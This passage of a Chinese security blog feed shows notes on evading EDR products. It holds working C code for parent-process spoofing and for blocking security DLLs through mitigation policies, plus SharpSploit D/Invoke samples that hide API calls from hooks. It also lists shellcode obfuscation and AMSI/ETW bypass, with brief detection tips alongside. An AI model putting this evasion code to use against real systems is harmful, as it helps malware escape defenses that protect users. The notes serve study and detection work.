使用未被EDR产品检测的高级注入技术</h3><ul><li><a href="http://hacky.ren/2022/10/25/高级注入技术/" target="_blank" rel="external">http://hacky.ren/2022/10/25/高级注入技术/</a></li></ul><h3 id="0x06-PPID-Spoofing-欺骗"><a href="#0x06-PPID-Spoofing-欺骗" class="headerlink" title="0x06 PPID Spoofing(欺骗)"></a>0x06 PPID Spoofing(欺骗)</h3><ul><li><p>PPID Spoofing基于CreateProcess的lpStartupInfo参数可以被重新定义，lpStartupInfo参数指向_STARTUPINFOEXA，_STARTUPINFOEXA的<code>lpAttributeList</code>可以通过<code>InitializeProcThreadAttributeList</code>函数创建，并且通过<code>UpdateProcThreadAttribute</code>修改。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">typedef struct _STARTUPINFOEXA &#123;</div><div class="line">  <span class="type">STARTUPINFOA</span>                 <span class="type">StartupInfo</span>;</div><div class="line">  <span class="type">LPPROC_THREAD_ATTRIBUTE_LIST</span> lpAttributeList;</div><div class="line">&#125; <span class="type">STARTUPINFOEXA</span>, *<span class="type">LPSTARTUPINFOEXA</span>;</div></pre></td></tr></table></figure></li><li><p>当<code>UpdateProcThreadAttribute</code>的<code>lpValue</code>设置为父进程句柄，即可实现PPID Spoofing欺骗</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> UpdateProcThreadAttribute(</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">out</span>]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,</div><div class="line">  [<span class="keyword">in</span>]            DWORD                        dwFlags,</div><div class="line">  [<span class="keyword">in</span>]            DWORD_PTR                    Attribute,</div><div class="line">  [<span class="keyword">in</span>]            PVOID                        lpValue,</div><div class="line">  [<span class="keyword">in</span>]            SIZE_T                       cbSize,</div><div class="line">  [<span class="keyword">out</span>, optional] PVOID                        lpPreviousValue,</div><div class="line">  [<span class="keyword">in</span>, optional]  PSIZE_T                      lpReturnSize</div><div class="line">);</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">int</span> main() &#123;</div><div class="line">    STARTUPINFOEXA si;</div><div class="line">    PROCESS_INFORMATION pi;</div><div class="line">    SIZE_T attributeSize;</div><div class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(STARTUPINFOEXA));</div><div class="line">    LPCWSTR parentProcess = L<span class="string">"OneDrive.exe"</span>;</div><div class="line">    DWORD parentPID = getPPID(parentProcess);</div><div class="line">    printf(<span class="string">"[+] Spoofing %ws (PID: %u) as the parent process.\n"</span>, parentProcess, parentPID);</div><div class="line">    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, <span class="literal">false</span>, parentPID);</div><div class="line">    InitializeProcThreadAttributeList(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</div><div class="line">    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="number">0</span>, attributeSize);</div><div class="line">    InitializeProcThreadAttributeList(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</div><div class="line">    UpdateProcThreadAttribute(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="keyword">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">    si.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);</div><div class="line">    LPCWSTR spawnProcess = L<span class="string">"C:\\Windows\\System32\\notepad.exe"</span>;</div><div class="line">    CreateProcess(spawnProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (STARTUPINFO*)&amp;si, &amp;pi);</div><div class="line">    printf(<span class="string">"[+] Spawning %ws (PID: %u)\n"</span>, spawnProcess, pi.dwProcessId);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>可以使用ETW进行检测，ETW数据中可以使用的数据主要有，如果EventHeader ProcessId和ParentProcessID相同，则没有进行欺骗，如果不同说明进行了欺骗</p><ul><li>EventHeader ProcessId 产生事件的进程</li><li>ProcessID 创建的进程</li><li>ParentProcessID 父进程</li></ul></li><li><img src="http://hacky.wang/blog/20230301/R5iAsQOhtjoH.png?imageslim" alt="mark"></li><li><p><img src="http://hacky.wang/blog/20230301/imcHIXxa2TPQ.png?imageslim" alt="mark"></p></li><li><p><a href="https://blog.f-secure.com/detecting-parent-pid-spoofing/" target="_blank" rel="external">detecting-parent-pid-spoofing</a></p></li><li><a href="https://forum.butian.net/share/1076" target="_blank" rel="external">Parent Process ID (PPID) Spoofing</a></li></ul><h3 id="0x07-Dll-Block"><a href="#0x07-Dll-Block" class="headerlink" title="0x07 Dll Block"></a>0x07 Dll Block</h3><ul><li>旨在组织EDR将dll注入进程，以缓解进程被Hook</li><li>1.为子进程实现Dll Block:和PPID欺骗一样，通过调用<code>UpdateProcThreadAttribute</code>将设置线程tributes,将<code>Attribute</code>设置为<code>PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code>,并将value设置为<code>PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code>,值得注意的是<strong>这个方法只能为子进程设置BlockDlls</strong>，因为最终<code>CreateProcessA</code>创建子进程并设置线程属性。<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> UpdateProcThreadAttribute(</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">out</span>]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,</div><div class="line">  [<span class="keyword">in</span>]            DWORD                        dwFlags,</div><div class="line">  [<span class="keyword">in</span>]            DWORD_PTR                    Attribute,</div><div class="line">  [<span class="keyword">in</span>]            PVOID                        lpValue,</div><div class="line">  [<span class="keyword">in</span>]            SIZE_T                       cbSize,</div><div class="line">  [<span class="keyword">out</span>, optional] PVOID                        lpPreviousValue,</div><div class="line">  [<span class="keyword">in</span>, optional]  PSIZE_T                      lpReturnSize</div><div class="line">);</div><div class="line"><span class="comment">//example</span></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line">PROCESS_INFORMATION pi = &#123;&#125;;</div><div class="line">STARTUPINFOEXA si = &#123;&#125;;</div><div class="line">SIZE_T attributeSize = <span class="number">0</span>;</div><div class="line"><span class="comment">//</span></div><div class="line">InitializeProcThreadAttributeList(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</div><div class="line">PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);</div><div class="line">InitializeProcThreadAttributeList(attributes, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</div><div class="line"><span class="comment">//</span></div><div class="line">DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;</div><div class="line">UpdateProcThreadAttribute(attributes, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, <span class="keyword">sizeof</span>(DWORD64), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">si.lpAttributeList = attributes;</div><div class="line"><span class="comment">//</span></div><div class="line">CreateProcessA(<span class="literal">NULL</span>, (LPSTR)<span class="string">"notepad"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);</div><div class="line">HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attributes);</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">``` </div><div class="line"></div><div class="line">* <span class="number">2.</span>为本进程设置BlockDll，通过`SetProcessMitigationPolicy`函数设置阻止策略,将策略设置为`ProcessSignaturePolicy`即可。</div></pre></td></tr></table></figure></li></ul><p>BOOL SetProcessMitigationPolicy(<br>  [in] PROCESS_MITIGATION_POLICY MitigationPolicy,<br>  [in] PVOID                     lpBuffer,<br>  [in] SIZE_T                    dwLength<br>);<br>ROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy;<br>policy.MitigationOptIn = 1;<br>SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;policy, sizeof(policy))<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* <span class="number">3</span>.针对Blockdll的**检测**：通过`GetProcessMitigationPolicy`进行检测,将`PROCESS_MITIGATION_POLICY`设置为ProcessSignaturePolicy，读取value，如果是`ProcessSignaturePolicy`则说明是BlockDll。</div></pre></td></tr></table></figure></p><p>BOOL GetProcessMitigationPolicy(<br>  [in]  HANDLE                    hProcess,<br>  [in]  PROCESS_MITIGATION_POLICY MitigationPolicy,<br>  [out] PVOID                     lpBuffer,<br>  [in]  SIZE_T                    dwLength<br>);<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>4.部分EDR存在微软的签名，此时会绕过BlockDll，通过引入ACG,ACG即漏洞利用保护参考,[<span class="string">开启ACG时</span>](<span class="link">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessmitigationpolicy</span>)，进程无法生成动态代码或修改现有的可执行代码。即Alloc内存会失败。</div><div class="line"></div><div class="line"><span class="bullet">* </span>5.<span class="strong">**检测**</span>同BlockDll </div><div class="line"></div><div class="line"><span class="bullet">* </span>[<span class="string">Preventing 3rd Party DLLs from Injecting into your Malware</span>](<span class="link">https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes</span>)</div><div class="line"><span class="bullet">* </span>[<span class="string">http://hacky.ren/2022/05/29/绿盟科技-每周蓝军技术推送(2022.5.14-5.20)</span>](<span class="link">http://hacky.ren/2022/05/29/绿盟科技-每周蓝军技术推送(2022.5.14-5.20</span>))</div><div class="line"><span class="bullet">* </span>[<span class="string">检测BlockDll和ACG</span>](<span class="link">https://tttang.com/archive/1618</span>)</div><div class="line"></div><div class="line"><span class="section">### 0x08 过静态检测</span></div><div class="line"><span class="bullet">* </span>1.ShellCode加密/混淆</div><div class="line"><span class="bullet">* </span>2.加壳(Pack)</div><div class="line"><span class="bullet">* </span>3.多态变形</div><div class="line"><span class="bullet">* </span>4.Shellcode存储在资源段</div><div class="line"><span class="bullet">* </span>5.减少熵</div><div class="line"></div><div class="line"><span class="section">### 0x09 过动态检测</span></div><div class="line"><span class="bullet">* </span>1.Bypass AMSI</div><div class="line"><span class="bullet">* </span>2.网络分段式执行</div><div class="line"><span class="bullet">* </span>3.间接系统调用 </div><div class="line"><span class="bullet">* </span>4.延迟执行</div><div class="line"><span class="bullet">* </span>5.Bypass ETW</div><div class="line"><span class="bullet">* </span>6.D/Invoke</div><div class="line"><span class="bullet">* </span>7.LOLBIN</div><div class="line"><span class="bullet">* </span>8.检查沙箱/虚拟机</div><div class="line"></div><div class="line"></div><div class="line"><span class="section">### 0x10 D/Invoke</span></div><div class="line"><span class="bullet">* </span>P/Invoke 即Platform Invoke，其允许.NET 应用程序访问非托管库(DLL) 中的数据和API，即通过使用P/Invoke，C#开发人员可以轻松调用标准 Windows API。由于.Net程序更加容易从内存中执行，由此不需要将文件落地即可实现更加高级的功能。</div><div class="line"><span class="bullet">* </span>P/Invoke缺点：</div><div class="line"><span class="code">    * 1.P/Invoke所需要Windows API函数都静态存放在.Net程序集的导入表中，可以被观察到，如果文件不落地可能影响不大。</span></div><div class="line"><span class="code">    * 2.P/Inovle执行的Windows API函数，如果EDR等安全软件提前Hook，则也有可能被检测。</span></div><div class="line"></div><div class="line"><span class="bullet">* </span>D/Invole：Dynic Invoke 即动态执行，允许程序手动加载Dll文件，手动获取Windows API地址，类似于LoadLibrary/GetProcAddress模式。</div><div class="line"></div><div class="line"><span class="bullet">* </span>执行函数，以下代码演示了使用DInvoke库执行<span class="code">`NtCreateThread`</span>API函数:</div><div class="line"><span class="code">    * 1.首先调用`GetLibraryAddress`获取NtCreateThread地址</span></div><div class="line"><span class="code">    * 2.调用`GetDelegateForFunctionPointer`获取委派</span></div><div class="line"><span class="code">    * 3.调用`NtCreateThreadEx`</span></div></pre></td></tr></table></figure></p><p> //Get a pointer to the NtCreateThreadEx function.<br>IntPtr pFunction = Execution.DynamicInvoke.Generic.GetLibraryAddress(@”ntdll.dll”, “NtCreateThreadEx”);<br>//<br>//Create an instance of a NtCreateThreadEx delegate from our function pointer.<br>DELEGATES.NtCreateThreadEx createThread = (NATIVE_DELEGATES.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(<br>   pFunction, typeof(NATIVE_DELEGATES.NtCreateThreadEx));<br>//<br>//Invoke NtCreateThreadEx using the delegate<br>createThread(ref threadHandle,<br>    Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,<br>    IntPtr.Zero,<br>    process.Handle, baseAddr, IntPtr.Zero, suspended, 0, 0, 0, IntPtr.Zero);<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* 加载模块</div><div class="line">    * 1<span class="selector-class">.GetPebLdrModuleEntry</span>：通过在 <span class="selector-tag">PEB</span> 中搜索对它的引用来搜索当前加载模块的基地址</div><div class="line">    * 2<span class="selector-class">.GetLibraryAddress</span>：首先检查模块是否被加载，如果没有加载则会调用`<span class="selector-tag">LoadModuleFromDisk</span>`加载，然后使用`<span class="selector-tag">GetExportAddress</span>`查找模块中的函数,参数可以是函数名，函数序号，<span class="selector-tag">Hash</span>。</div><div class="line">    * 3<span class="selector-class">.GetLoadedModuleAddress</span>：加载模块基地址</div><div class="line">    * 4<span class="selector-class">.LoadModuleFromDisk</span>：使用<span class="selector-tag">LdrLoaddll</span>加载一个<span class="selector-tag">dll</span>，但是会产生一个模块加载事件，不建议使用</div><div class="line">    * 5<span class="selector-class">.GetSyscallStub</span>：映射新副本<span class="selector-tag">ntdll</span><span class="selector-class">.dll</span>并从新副本复制系统调用包装器的字节。这可用于直接执行系统调用</div><div class="line">    * 6<span class="selector-class">.GetExportAddress</span>:从模块在内存中的基地址开始，解析模块的<span class="selector-tag">PE</span>头文件，定位到特定的函数。可以采用字符串、序号或哈希作为您希望调用的函数的标识符。</div><div class="line">    * 7<span class="selector-class">.MapModuleToMemory</span>：手动将模块映射到动态分配的内存中，正确对齐 <span class="selector-tag">PE</span> 部分，更正内存权限，并修复导入地址表。可以采用字节数组或磁盘上文件的名称。</div><div class="line">    * 8<span class="selector-class">.MapModuleToMemoryAddress</span>：手动将内存中已有的模块（包含在字节数组中）映射到内存中的特定位置。</div><div class="line">    * 9<span class="selector-class">.OverloadModule</span>：使用模块重载将模块映射到由磁盘上的诱饵 <span class="selector-tag">DLL</span> 支持的内存中。选择一个尚未加载、已签名且存在于%<span class="selector-tag">WINDIR</span>%\<span class="selector-tag">System32</span>. 在模块中执行代码的线程看起来像是在执行来自合法 <span class="selector-tag">DLL</span> 的代码。可以采用字节数组或磁盘上文件的名称。</div></pre></td></tr></table></figure></p><p>namespace SpTestcase<br>{<br>    class Program<br>    {<br>        static void Main(string[] args)<br>        {<br>            // Details<br>            String testDetail = @”</p><pre><code>#=================&gt;# Hello there!# I find things dynamically; base# addresses and function pointers.#=================&gt;&quot;;Console.WriteLine(testDetail);</code></pre><p>//<br>            // Get NTDLL base from the PEB<br>            Console.WriteLine(“[?] Resolve Ntdll base from the PEB..”);<br>            IntPtr hNtdll = SharpSploit.Execution.DynamicInvoke.Generic.GetPebLdrModuleEntry(“ntdll.dll”);<br>            Console.WriteLine(“[&gt;] Ntdll base address : “ + string.Format(“{0:X}”, hNtdll.ToInt64()) + “\n”);<br>//<br>            // Search function by name<br>            Console.WriteLine(“[?] Specifying the name of a DLL (\”ntdll.dll\”), resolve a function by walking the export table in-memory..”);<br>            Console.WriteLine(“[+] Search by name –&gt; NtCommitComplete”);<br>            IntPtr pNtCommitComplete = SharpSploit.Execution.DynamicInvoke.Generic.GetLibraryAddress(“ntdll.dll”, “NtCommitComplete”, true);<br>            Console.WriteLine(“[&gt;] pNtCommitComplete : “ + string.Format(“{0:X}”, pNtCommitComplete.ToInt64()) + “\n”);<br>//<br>            Console.WriteLine(“[+] Search by ordinal –&gt; 0x260 (NtSetSystemTime)”);<br>            IntPtr pNtSetSystemTime = SharpSploit.Execution.DynamicInvoke.Generic.GetLibraryAddress(“ntdll.dll”, 0x260, true);<br>            Console.WriteLine(“[&gt;] pNtSetSystemTime : “ + string.Format(“{0:X}”, pNtSetSystemTime.ToInt64()) + “\n”);<br>//<br>            Console.WriteLine(“[+] Search by keyed hash –&gt; 138F2374EC295F225BD918F7D8058316 (RtlAdjustPrivilege)”);<br>            Console.WriteLine(“[&gt;] Hash : HMACMD5(Key).ComputeHash(FunctionName)”);<br>            String fHash = SharpSploit.Execution.DynamicInvoke.Generic.GetAPIHash(“RtlAdjustPrivilege”, 0xaabb1122);<br>            IntPtr pRtlAdjustPrivilege = SharpSploit.Execution.DynamicInvoke.Generic.GetLibraryAddress(“ntdll.dll”, fHash, 0xaabb1122);<br>            Console.WriteLine(“[&gt;] pRtlAdjustPrivilege : “ + string.Format(“{0:X}”, pRtlAdjustPrivilege.ToInt64()) + “\n”);<br>//<br>            // Search for function from base address of DLL<br>            Console.WriteLine(“[?] Specifying the base address of DLL in memory ({0:X}), resolve function by walking its export table…”, hNtdll.ToInt64());<br>            Console.WriteLine(“[+] Search by name –&gt; NtCommitComplete”);<br>            IntPtr pNtCommitComplete2 = SharpSploit.Execution.DynamicInvoke.Generic.GetExportAddress(hNtdll, “NtCommitComplete”);<br>            Console.WriteLine(“[&gt;] pNtCommitComplete : “ + string.Format(“{0:X}”, pNtCommitComplete2.ToInt64()) + “\n”);<br>//<br>            // Pause execution<br>            Console.WriteLine(“[*] Pausing execution..”);<br>            Console.ReadLine();<br>        }<br>    }<br>}<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">* 内存调用执行</span></div><div class="line"><span class="comment">* Bypass Hook</span></div><div class="line"><span class="comment">    * 1.正常使用PInvoke</span></div></pre></td></tr></table></figure></p><p>// Call OpenProcess using PInvoke<br>Console.WriteLine(“[?] Call OpenProcess via PInvoke …”);<br>hProc = OpenProcess(SharpSploit.Execution.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, id);<br>Console.WriteLine(“[&gt;] Process handle : “ + string.Format(“{0:X}”, hProc.ToInt64()) + “\n”);<br>// Pause execution<br>Console.WriteLine(“[*] Pausing execution..”);<br>Console.ReadLine();<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>2.通过DInvoke(GetLibraryAddress方法)</div></pre></td></tr></table></figure></p><p>// Call OpenProcess using GetLibraryAddress (underneath the hood)<br>Console.WriteLine(“[?] Call OpenProcess from the loaded module list using System.Diagnostics.Process.GetCurrentProcess().Modules …”);<br>hProc = SharpSploit.Execution.DynamicInvoke.Win32.OpenProcess(SharpSploit.Execution.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, id);<br>Console.WriteLine(“[&gt;] Process handle : “ + string.Format(“{0:X}”, hProc.ToInt64()) + “\n”);<br>// Pause execution<br>Console.WriteLine(“[*] Pausing execution..”);<br>Console.ReadLine();<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>3.通过DInvoke(PEB获取基址)</div></pre></td></tr></table></figure></p><p>// Search function by name from module in PEB<br>Console.WriteLine(“[?] Specifying the name of a DLL (\”kernel32.dll\”), search the PEB for the loaded module and resolve a function by walking the export table in-memory…”);<br>Console.WriteLine(“[+] Search by name –&gt; OpenProcess”);<br>IntPtr pkernel32 = SharpSploit.Execution.DynamicInvoke.Generic.GetPebLdrModuleEntry(“kernel32.dll”);<br>IntPtr pOpenProcess = SharpSploit.Execution.DynamicInvoke.Generic.GetExportAddress(pkernel32, “OpenProcess”);<br>//Call OpenProcess<br>hProc = (IntPtr)SharpSploit.Execution.DynamicInvoke.Generic.DynamicFunctionInvoke(pOpenProcess, typeof(SharpSploit.Execution.DynamicInvoke.Win32.Delegates.OpenProcess), ref paramaters);<br>Console.WriteLine(“[&gt;] Process Handle : “ + string.Format(“{0:X}”, hProc.ToInt64()) + “\n”);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>4.映射Kernel32.dll</div></pre></td></tr></table></figure></p><p>// Manually map kernel32.dll<br>// Search function by name from module in PEB<br>Console.WriteLine(“[?] Manually map a fresh copy of a DLL (\”kernel32.dll\”), and resolve a function by walking the export table in-memory…”);<br>Console.WriteLine(“[+] Search by name –&gt; OpenProcess”);<br>SharpSploit.Execution.PE.PE_MANUAL_MAP moduleDetails = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(“C:\Windows\System32\kernel32.dll”);<br>Console.WriteLine(“[&gt;] Module Base : “ + string.Format(“{0:X}”, moduleDetails.ModuleBase.ToInt64()) + “\n”);<br>//Call OpenProcess<br>hProc = (IntPtr)SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, “OpenProcess”, typeof(SharpSploit.Execution.DynamicInvoke.Win32.Delegates.OpenProcess), paramaters);<br>Console.WriteLine(“[&gt;] Process Handle : “ + string.Format(“{0:X}”, hProc.ToInt64()) + “\n”);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>5.覆写Kernel32</div></pre></td></tr></table></figure></p><p>// Map kernel32.dll using Module Overloading<br>// Search function by name from module in PEB<br>Console.WriteLine(“[?] Use Module Overloading to map a fresh copy of a DLL (\”kernel32.dll\”) into memory backed by another file on disk. Resolve a function by walking the export table in-memory…”);<br>Console.WriteLine(“[+] Search by name –&gt; OpenProcess”);<br>moduleDetails = SharpSploit.Execution.ManualMap.Overload.OverloadModule(“C:\Windows\System32\kernel32.dll”);<br>Console.WriteLine(“[&gt;] Module Base : “ + string.Format(“{0:X}”, moduleDetails.ModuleBase.ToInt64()) + “\n”);<br>//Call OpenProcess<br>hProc = (IntPtr)SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, “OpenProcess”, typeof(SharpSploit.Execution.DynamicInvoke.Win32.Delegates.OpenProcess), paramaters);<br>Console.WriteLine(“[&gt;] Process Handle : “ + string.Format(“{0:X}”, hProc.ToInt64()) + “\n”);<br>```</p><ul><li>系统调用执行，利用<code>GetSyscallStub</code></li><li><p>ShellCode执行</p><ul><li><code>SharpSploit.Execution.ShellCode.ShellCodeExecute</code></li><li><code>DynamicFunctionInvoke</code>委派执行ShellCode</li></ul></li><li><p><a href="https://thewover.github.io/Dynamic-Invoke/" target="_blank" rel="external">https://thewover.github.io/Dynamic-Invoke/</a></p></li><li><a href="https://github.com/FuzzySecurity/BlueHatIL-2020/tree/master/Usage" target="_blank" rel="external">https://github.com/FuzzySecurity/BlueHatIL-2020/tree/master/Usage</a>上述例子的源码</li><li><a href="https://github.com/TheWover/DInvoke" target="_blank" rel="external">https://github.com/TheWover/DInvoke</a></li><li><a href="https://github.com/cobbr/SharpSploit" target="_blank" rel="external">https://github.com/cobbr/SharpSploit</a></li></ul><h3 id="0x10-LOLBin"><a href="#0x10-LOLBin" class="headerlink" title="0x10 LOLBin"></a>0x10 LOLBin</h3><ul><li>Living off the land Binaries,主要描述为windows自带二进制文件，被恶意利用，从事不属于该文件所工作的范畴。</li><li>常见的情况：<ul><li>下载</li><li>解密</li><li>Bypass UAC等</li></ul></li><li><a href="http://blog.topsec.com.cn/lolbins%E8%AF%A6%E8%A7%A3/" target="_blank" rel="external">http://blog.topsec.com.cn/lolbins%E8%AF%A6%E8%A7%A3/</a></li><li><a href="https://www.anquanke.com/post/id/223232" target="_blank" rel="external">https://www.anquanke.com/post/id/223232</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;主要记载了常见的Bypass EDR的方法。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="https://findream.github.io/categories/ATT-CK/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK 执行</title>
    <link href="https://findream.github.io/2022/11/20/ATT&amp;CK%E6%89%A7%E8%A1%8C/"/>
    <id>https://findream.github.io/2022/11/20/ATT&amp;CK执行/</id>
    <published>2022-11-20T07:02:11.000Z</published>
    <updated>2023-03-26T06:37:27.109Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-命令和脚本解释器"><a href="#0x01-命令和脚本解释器" class="headerlink" title="0x01 命令和脚本解释器"></a>0x01 命令和脚本解释器</h2><ul><li>powershell</li><li>cmd</li><li>js</li><li>vb(s)</li><li>python</li></ul><a id="more"></a><h2 id="0x02-客户端漏洞利用"><a href="#0x02-客户端漏洞利用" class="headerlink" title="0x02 客户端漏洞利用"></a>0x02 客户端漏洞利用</h2><ul><li>客户端漏洞利用</li></ul><h2 id="0x03-进程间通讯"><a href="#0x03-进程间通讯" class="headerlink" title="0x03 进程间通讯"></a>0x03 进程间通讯</h2><h3 id="3-1-组件对象模型"><a href="#3-1-组件对象模型" class="headerlink" title="3-1 组件对象模型"></a>3-1 组件对象模型</h3><ul><li>组件对象模型，COM 是本机 Windows 应用程序编程接口 (API) 的进程间通信 (IPC) 组件，它支持软件对象或实现一个或多个接口的可执行代码之间的交互。</li><li>暴露的各种 COM 接口可被滥用以通过各种编程语言（如 C、C++、Java 和Visual Basic）调用任意执行。</li><li>作用<ul><li>收集信息</li><li>持久化</li><li>执行进程</li><li>计划任务</li><li>Bypass UAC</li></ul></li></ul><h3 id="3-2-DDE"><a href="#3-2-DDE" class="headerlink" title="3-2 DDE"></a>3-2 DDE</h3><ul><li><a href="http://hacky.ren/2021/04/25/Dynamic%20Data%20Exchange/" target="_blank" rel="external">http://hacky.ren/2021/04/25/Dynamic Data Exchange/</a></li></ul><h3 id="0x04-计划任务"><a href="#0x04-计划任务" class="headerlink" title="0x04 计划任务"></a>0x04 计划任务</h3><ul><li>通过<code>schtasks</code>程序创建计划任务</li><li>通过COM编程创建计划任务，C#的TaskService类NewTask方法，以及PowerShell的<code>Schedule.Service</code>对象可以创建计划任务</li><li>图形界面(实战不适合)</li><li>检测方法1(进程)<ul><li>父进程<code>svchost.exe -k netsvcs -p -s Schedule</code>,但是win10以前版本看不到<code>-s Schedule</code></li><li>在以前系统中(win7)，计划任务的进程树<code>svchost.exe -&gt; taskeng.exe -&gt; 